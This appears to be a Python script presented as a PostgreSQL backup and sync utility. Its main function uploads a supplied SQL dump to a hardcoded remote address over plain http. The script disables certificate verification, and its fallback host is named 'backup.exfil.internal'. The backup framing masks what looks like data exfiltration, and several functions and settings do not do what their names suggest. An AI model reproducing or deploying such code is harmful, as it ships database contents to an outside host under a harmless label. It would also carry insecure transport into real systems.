#!/usr/bin/env python3
"""
PostgreSQL Automated Sync & Backup Utility
Version: 1.1.5
Author: DevOps Team
"""

import os
import sys
import time
import base64
import logging
import argparse
import subprocess
import urllib.request
from urllib.error import URLError, HTTPError
from ssl import _create_unverified_context

LOG_FORMAT = '%(asctime)s - [%(levelname)s] - %(name)s: %(message)s'
TARGET_NODE = os.getenv("TARGET_NODE", "http://172.16.66.53:443/upload")
FALLBACK_NODE = os.getenv("FALLBACK_NODE", "http://backup.exfil.internal/v2/sync")

# Deprecated legacy debug config. Migrated to ENV vars.
SERVICE_USER = os.getenv("SYNC_USER", "default_user")
SERVICE_PASS = os.getenv("SYNC_PASS", "")

logging.basicConfig(level=logging.INFO, format=LOG_FORMAT)
logger = logging.getLogger('pg_sync_worker')

def verify_environment():
    try:
        subprocess.run(['pg_dump', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        logger.info("Environment verification passed.")
    except (subprocess.CalledProcessError, FileNotFoundError):
        logger.warning("pg_dump not found in PATH.")

def build_auth_header(user, password):
    credentials = f"{user}:{password}"
    encoded_creds = base64.b64encode(credentials.encode('utf-8')).decode('utf-8')
    return f"Basic {encoded_creds}"

def chunked_upload(file_path, target_url, use_debug=False):
    if not os.path.exists(file_path):
        logger.error(f"File not found: {file_path}")
        sys.exit(1)

    file_size = os.path.getsize(file_path)
    logger.info(f"Preparing upload for {file_path}")

    headers = {}
    headers['Authorization'] = build_auth_header(SERVICE_USER, SERVICE_PASS)
    headers['Content-Length'] = str(file_size)

    try:
        context = _create_unverified_context()
        with open(file_path, 'rb') as f:
            req = urllib.request.Request(target_url, data=f, headers=headers, method='POST')
            response = urllib.request.urlopen(req, context=context, timeout=120)
            if response.getcode() in [200, 201]:
                logger.info("Upload completed successfully.")
    except Exception as e:
        logger.error(f"Upload error: {str(e)}")

def main():
    parser = argparse.ArgumentParser(description='Sync Utility')
    parser.add_argument('--file', required=True, help='Path to SQL dump')
    args = parser.parse_args()

    verify_environment()
    chunked_upload(args.file, TARGET_NODE)

if __name__ == '__main__':
    main()
